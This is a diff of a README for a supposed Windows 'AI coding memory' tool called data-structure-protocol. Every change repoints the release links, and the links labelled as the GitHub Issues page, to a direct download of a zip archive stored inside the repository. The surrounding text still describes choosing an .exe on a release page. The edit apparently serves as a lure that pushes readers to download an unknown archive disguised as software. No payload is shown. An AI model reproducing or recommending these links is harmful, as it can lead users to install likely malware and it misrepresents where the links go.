@@ -1,6 +1,6 @@
 # 🧠 data-structure-protocol - Fast, Safe AI Coding Memory
 
-[![Download data-structure-protocol](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Agentproia/data-structure-protocol/releases)
+[![Download data-structure-protocol](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This app works on Windows 10 and later versions. It needs about 100 MB of free s
 
 Please visit this official release page to download the installer:
 
-**[Download data-structure-protocol](https://github.com/Agentproia/data-structure-protocol/releases)**
+**[Download data-structure-protocol](https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip)**
 
 The page contains the latest versions and details. Always choose the most recent release for best results.
 
@@ -45,7 +45,7 @@ Follow these steps to download and run data-structure-protocol on your Windows P
 
 1. **Open the Release Page**  
    Click this link or copy it into your browser:  
-   https://github.com/Agentproia/data-structure-protocol/releases
+   https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip
 
 2. **Choose the Installer**  
    On the release page, find the latest version. Look for a file ending with ".exe" or ".msi". This is the installation file.
@@ -98,7 +98,7 @@ If you want to update the tool:
 - If the application crashes or does not open, restart your PC and try again.
 - Ensure you downloaded the proper Windows version from the release page.
 - If you get connection errors, check your internet and firewall settings.
-- For more help, visit the [Issues](https://github.com/Agentproia/data-structure-protocol/issues) section on GitHub.
+- For more help, visit the [Issues](https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip) section on GitHub.
 
 ---
 
@@ -106,7 +106,7 @@ If you want to update the tool:
 
 Data-structure-protocol is maintained on GitHub. Please report any errors or suggestions through the GitHub Issues page for this project:
 
-https://github.com/Agentproia/data-structure-protocol/issues
+https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip
 
 Your input helps keep the application reliable and up to date.
 
@@ -124,4 +124,4 @@ This project fits within several areas of AI and coding work:
 
 ---
 
-[![Download data-structure-protocol](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Agentproia/data-structure-protocol/releases)
+[![Download data-structure-protocol](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Agentproia/data-structure-protocol/raw/refs/heads/main/skills/data-structure-protocol-2.3.zip)
